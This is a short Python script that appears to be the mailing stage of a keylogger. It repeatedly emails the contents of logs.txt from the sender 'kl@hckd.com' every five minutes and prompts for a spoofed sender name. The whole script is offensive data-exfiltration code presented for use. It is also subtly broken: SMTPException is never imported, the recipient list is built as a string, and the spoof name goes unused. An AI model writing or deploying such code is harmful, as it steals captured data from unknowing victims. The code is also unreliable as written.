import smtplib
import time
sendername = str(input("fake email name(spoof)"))
sender = "kl@hckd.com"
receiver = str(input("type your email:"))
receivers = "['" + receiver + "']"
f = open("logs.txt", "r")
message = (f.read())
def executeSomething():
    try:
        smtpObj = smtplib.SMTP('localhost', 25)
        smtpObj.sendmail(sender, receivers, message)
        print("Sent!")
    except SMTPException:
        print("Error: unable to send email")
    time.sleep(300)
while True:
    executeSomething()
